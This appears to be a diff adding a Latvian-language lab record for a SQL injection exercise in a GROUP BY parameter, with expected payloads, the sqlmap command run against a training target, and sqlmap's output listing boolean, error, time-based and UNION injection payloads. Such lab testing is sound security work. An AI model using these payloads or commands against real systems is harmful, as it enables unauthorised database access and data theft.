@@ -1,0 +1,37 @@
+=================================================================================
+1. Īpašība: tiek injicēts “GROUP BY” klauzulā
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?group=username having username like 'usxxx%25'
+3.2. error-based: ?group=username'
+3.3. time-based: ?group=username or sleep(1)
+3.4. union: ?group=username union select 1,2,3
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 14278741 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http:///sqlinjection/example6/?group=username" -p group --risk=3 --level=5
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameter 'group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 574 HTTP(s) requests:
+---
+Parameter: group (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: group=(SELECT (CASE WHEN (3954=3954) THEN 0x757365726e616d65 ELSE (SELECT 5842 UNION SELECT 2447) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: group=username AND (SELECT 3424 FROM(SELECT COUNT(*),CONCAT(0x71706b6271,(SELECT (ELT(3424=3424,1))),0x7176707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: group=username OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: group=username UNION ALL SELECT CONCAT(0x71706b6271,0x71464c5a4846446d54515375575279414b7a645a7978646f4f6d56657947537552666e7942425a78,0x7176707071),NULL,NULL-- -
+---
